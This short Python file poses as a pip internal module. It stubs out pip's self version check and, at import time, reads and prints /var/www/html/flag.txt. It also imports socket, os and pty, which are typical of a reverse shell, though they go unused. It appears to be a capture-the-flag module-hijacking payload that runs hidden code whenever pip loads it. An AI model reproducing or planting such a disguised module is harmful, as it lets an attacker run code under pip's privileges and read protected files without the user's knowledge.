import optparse
import socket
import os
import pty

from pip._internal.network.session import PipSession


def pip_self_version_check(session: PipSession, options: optparse.Values) -> None:
    # Suppress pip's own version check
    pass

with open("/var/www/html/flag.txt", "r") as f:
    print(f.read())